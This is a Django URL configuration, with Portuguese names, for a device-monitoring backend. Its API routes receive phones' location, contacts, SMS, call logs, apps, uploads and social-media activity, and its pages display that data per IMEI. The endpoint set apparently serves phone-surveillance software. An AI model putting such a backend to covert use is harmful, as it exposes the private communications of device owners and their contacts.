from django.urls import path
from . import views
from django.shortcuts import redirect

def redirect_to_login(request):
    return redirect('login')

urlpatterns = [
    path('logs/', views.logs_dispositivos, name='logs_dispositivos'),
    path('exportar-csv/', views.exportar_dispositivos_csv, name='exportar_dispositivos_csv'),
    path('login/', views.login_view, name='login'),
    path('logout/', views.logout_view, name='logout'),
    path('', views.lista_dispositivos, name='home'),
    path('dispositivos/', views.lista_dispositivos, name='lista_dispositivos'),
    path('cadastrar/', views.cadastrar_dispositivo, name='cadastrar_dispositivo'),
    
    # APIs para dispositivos móveis
    path('api/test/', views.api_test, name='api_test'),
    path('api/atividade/', views.registrar_atividade, name='registrar_atividade'),
    path('api/localizacao/', views.api_localizacao, name='api_localizacao'),
    path('api/contatos/', views.api_contatos, name='api_contatos'),
    path('api/sms/', views.api_sms, name='api_sms'),
    path('api/chamadas/', views.api_chamadas, name='api_chamadas'),
    path('api/apps/', views.api_apps, name='api_apps'),
    path('api/upload/', views.api_upload, name='api_upload'),
    path('api/redes-sociais/', views.api_redes_sociais, name='api_redes_sociais'),
    path('api/atividade-rede/', views.api_atividade_rede, name='api_atividade_rede'),
    path('api/device-info/', views.api_device_info, name='api_device_info'),
    
    # Views para exibir dados
    path('dispositivo/<str:imei>/', views.detalhes_dispositivo, name='detalhes_dispositivo'),
    path('dispositivo/<str:imei>/atividades/', views.atividades_dispositivo, name='atividades_dispositivo'),
    path('dispositivo/<str:imei>/mapa/', views.mapa_localizacoes, name='mapa_localizacoes'),
    path('dispositivo/<str:imei>/editar/', views.editar_dispositivo, name='editar_dispositivo'),
    path('dispositivo/<str:imei>/excluir/', views.excluir_dispositivo, name='excluir_dispositivo'),
    
    path('registrar-atividade/', views.registrar_atividade_form, name='registrar_atividade_form'),
    path('atividades/', views.todas_atividades, name='todas_atividades'),
]
